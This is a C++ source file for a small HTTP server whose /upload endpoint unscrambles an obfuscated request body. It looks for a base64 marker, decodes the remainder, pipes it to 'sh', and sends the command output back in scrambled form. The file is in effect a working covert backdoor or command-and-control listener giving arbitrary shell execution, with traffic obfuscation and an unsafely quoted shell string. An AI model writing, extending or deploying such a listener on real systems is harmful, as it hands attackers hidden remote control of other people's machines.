#include "httplib.h"
#include <fstream>
#include <iostream>
#include <chrono>
#include <thread>
#include <vector>
#include <algorithm>
#include <array>
#include <cstdio>

std::string shuffle(std::string input) {
    std::vector<std::string> arr;
    for (std::size_t i = 0; i < input.size(); i += 4) {
        arr.push_back(input.substr(i, 4));
    }

    // shuffle 1
    std::vector<std::string> arr1;
    bool front = true;
    while (!arr.empty()) {
        std::string last = arr.back();
        arr.pop_back();
        if (front)
            arr1.insert(arr1.begin(), last);
        else
            arr1.push_back(last);
        front = !front;
    }

    // shuffle 2
    for (std::size_t i = 0; i + 1 < arr1.size(); i += 2) {
        std::string temp = arr1[i];
        arr1[i] = arr1[i + 1];
        arr1[i + 1] = temp;
    }

    std::string output;
    for (std::string chunk : arr1)
        output += chunk;

    return output;
}

std::string unshuffle(std::string raw) {
    // make into array
    std::vector<std::string> arr(raw.size() / 4);
    int size = arr.size();
    for (int i = 0; i < size; i++){
        arr[i] = raw.substr(i * 4, 4);
    }
    // shuffle 2: swap pair
    for (int i = 0; i < size - 1; i += 2){
        std::string temp = arr[i];
        arr[i] = arr[i + 1];
        arr[i + 1] = temp;
    }
    // shuffle 1: unravel from inside
    int middle = (size - 1) / 2;
    std::vector<std::string> result;
    result.push_back(arr[middle]);
    for (int count = 1; middle + count < size || middle - count >= 0; count++) {
        if (middle + count < size) {
            result.push_back(arr[middle + count]);
        }
        if (middle - count >= 0) {
            result.push_back(arr[middle - count]);
        }
    }
    std::reverse(result.begin(), result.end());
    std::string output;
    for (auto word : result) {
        output += word;
    }
    return output;
}

int main() {
    httplib::Server server;

    server.Post("/upload", [](const httplib::Request& req, httplib::Response& res) {
        std::cout << "Received " << req.body.size() << " bytes\n";
        std::string body(req.body.data(), req.body.size());
        body = unshuffle(body);
        std::string key = "U1RBUlQ6";
        std::string response;

        size_t pos = body.find(key);
        if (pos != std::string::npos) {
            std::string raw_cmd = body.substr(pos + key.length());
            std::string cmd = "echo '" + raw_cmd + "' | base64 -d | sh";
            FILE* pipe = popen(cmd.c_str(), "r");
            if (!pipe) {
                res.set_content("failed", "text/plain");
                return;
            }
            std::array<char, 128> buffer;
            while (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
                response += buffer.data();
            pclose(pipe);
        } else 
            response = "...";
        response = shuffle(response);
        res.set_content(response, "text/plain");
    });

    if (!server.listen("127.0.0.1", 8443)) {
        std::cerr << "Could not listen on port 8443\n";
        return 1;
    }
}